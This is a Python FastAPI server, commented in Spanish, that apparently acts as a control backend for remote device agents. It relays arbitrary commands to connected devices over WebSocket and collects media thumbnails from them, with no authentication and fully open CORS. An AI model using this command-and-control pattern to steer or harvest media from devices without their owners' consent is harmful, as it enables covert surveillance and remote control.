import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict

# --- INICIALIZACIÓN DE LA APLICACIÓN ---
app = FastAPI(title="Agente Control Backend - Versión Funcional")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, dict] = {}
device_thumbnails_cache: Dict[str, list] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str

class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str

# --- ENDPOINTS (RUTAS DE LA API) ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_thumbnails_cache: del device_thumbnails_cache[device_id]

@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    target_id = command.target_id
    if target_id not in connected_agents:
        return {"status": "error"}
    try:
        await connected_agents[target_id]["ws"].send_text(command.json())
        return {"status": "success"}
    except Exception:
        return {"status": "error"}

@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
    device_thumbnails_cache[device_id] = [thumb.dict() for thumb in thumbnails]
    print(f"Recibidas {len(thumbnails)} miniaturas del agente '{connected_agents.get(device_id, {}).get('name', 'Desconocido')}'")
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return device_thumbnails_cache.get(device_id, [])
